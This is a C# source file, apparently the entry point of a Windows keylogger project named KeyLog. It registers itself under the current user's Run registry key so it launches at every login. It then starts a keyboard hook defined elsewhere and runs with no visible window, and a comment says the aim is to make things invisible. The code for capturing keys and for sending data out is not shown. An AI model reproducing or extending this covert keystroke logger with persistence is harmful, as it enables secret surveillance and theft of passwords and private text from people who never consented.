using System;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Web.Script.Serialization;
using Microsoft.Win32;
using KeyLog.Common;


namespace KeyLog {
  static class Program {

    [STAThread]
    static void Main() {
      SetStartup();
      KbdHook.Init();
      Application.Run();
      // time to make things invisible
      // Application.EnableVisualStyles();
      // Application.SetCompatibleTextRenderingDefault(false);
      // Application.Run(new MainWin());
    }

    // Register this program to run at startup.
    static void SetStartup() {
      var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      key.SetValue("KeyLog", Application.ExecutablePath.ToString());
    }

    static void LoadSettings(string path) {
      var text = File.ReadAllText(path);
      var json = new JavaScriptSerializer();
      var data = json.Deserialize<Dictionary<string, Dictionary<string, string>>[]>(text);
    }
  }
}
